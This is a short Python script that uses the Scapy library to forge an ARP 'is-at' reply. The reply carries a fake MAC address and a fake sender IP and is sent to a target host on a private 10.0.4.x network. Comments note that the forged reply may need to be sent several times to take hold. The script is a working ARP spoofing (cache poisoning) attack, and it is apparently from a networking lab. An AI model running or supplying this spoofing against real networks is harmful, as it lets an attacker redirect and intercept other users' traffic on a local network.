from scapy.layers.inet import Ether
from scapy.layers.l2 import ARP
from scapy.all import *

MY_IP = '10.0.4.34'
MY_HW = 'ec:b1:d7:31:23:25'
DST_IP = '10.0.4.25'
DST_HW = 'ec:b1:d7:31:24:b5'

print(conf.iface)

trame = Ether(
    dst=DST_HW,
    src='00:01:02:03:04:31') /\
        ARP(
            # NOTE:
            #  - If you specify op='is-at', then you may need to send the response multiple times.
            #  - if you specify op='who-has', then a single request does the job.
            op='is-at',
            hwsrc='00:01:02:03:04:31',
            psrc='10.0.4.139',
            hwdst=DST_HW,
            pdst=DST_IP)

trame.show()
rep = srp1(trame, iface='eno1')
rep.show()






